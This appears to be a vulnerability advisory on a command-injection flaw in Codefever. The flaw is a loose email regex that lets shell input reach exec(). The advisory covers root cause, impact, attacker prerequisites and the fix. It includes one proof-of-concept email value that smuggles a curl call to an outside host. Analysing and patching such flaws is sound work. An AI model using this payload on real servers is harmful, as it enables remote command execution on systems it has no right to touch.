The provided content describes a Remote Command Execution vulnerability in Codefever versions prior to 2023.2.7-b1c2e7f.

**Root cause of vulnerability:**
- The vulnerability stems from a combination of two issues:
  1. Unrestricted data input in `application/libraries/service/Network/Request.php`, specifically lines 44-56 allows any data to be passed through the `Request::parse()` method.
  2. A vulnerable regular expression used for email validation in `/application/controllers/api/user.php`, specifically lines 294-295. The regex lacks a backslash in front of the dot (`.`), causing it to match any character instead of just a literal dot, enabling injection.

**Weaknesses/vulnerabilities present:**
- Improper input validation and sanitization in the `Request.php` file.
- Insecure regular expression in `user.php` that allows for command injection.
- Use of the `exec` function with user-controlled input within the `EmailSender::send()` function.

**Impact of exploitation:**
- Remote command execution on the server. An attacker can execute arbitrary system commands by injecting commands into the email field.

**Attack vectors:**
- The attacker can exploit this vulnerability by sending a crafted request with a malicious email address.

**Required attacker capabilities/position:**
- The attacker needs to be able to register and log in to the application.
- The attacker needs to be able to send a request that triggers the vulnerable code path (specifically via the email registration or update).
- No specific network position is required if the application is publicly accessible.

**Technical Details:**
- The vulnerability is triggered by an email address that contains shell commands. The vulnerable regex in `user.php` does not correctly validate the email, allowing the injection. The injected commands are then executed through the `EmailSender::send()` function using the `exec` function.
- A proof-of-concept (POC) email address provided is:  `youyou@qq.com'xx|curl test.server.com;xx'xx`

**Additional Information:**
- The issue was reported and fixed in subsequent updates by changing the email validation regular expression and using a Command Utility to run commands.
- The fix involved changes to the email validation regular expression and use of Command Utility to run commands.
